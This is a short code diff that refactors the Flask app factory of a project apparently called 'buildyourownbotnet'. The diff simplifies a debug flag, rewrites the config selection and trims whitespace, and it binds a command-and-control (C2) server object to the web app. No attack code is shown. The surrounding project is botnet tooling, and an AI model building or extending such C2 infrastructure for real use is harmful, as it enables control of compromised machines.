@@ -14,7 +14,7 @@ login_manager.login_message_category = 'info'
 
 # server and client generator
 from buildyourownbotnet import client, server
-_debug = bool('--debug' in sys.argv)
+_debug = '--debug' in sys.argv
 c2 = server.C2(debug=_debug)
 
 def create_app(test=False):
@@ -25,12 +25,12 @@ def create_app(test=False):
                 template_folder='templates')
 
     # configure app
-    config = ProdConfig if not test else TestConfig
+    config = TestConfig if test else ProdConfig
     app.config.from_object(config)
 
     from buildyourownbotnet.models import db, bcrypt
     db.init_app(app)
-    
+
     with app.app_context():
         db.create_all()
         bcrypt.init_app(app)
@@ -54,5 +54,5 @@ def create_app(test=False):
 
         # bind app to server
         c2.bind_app(app)
-        
+
         return app
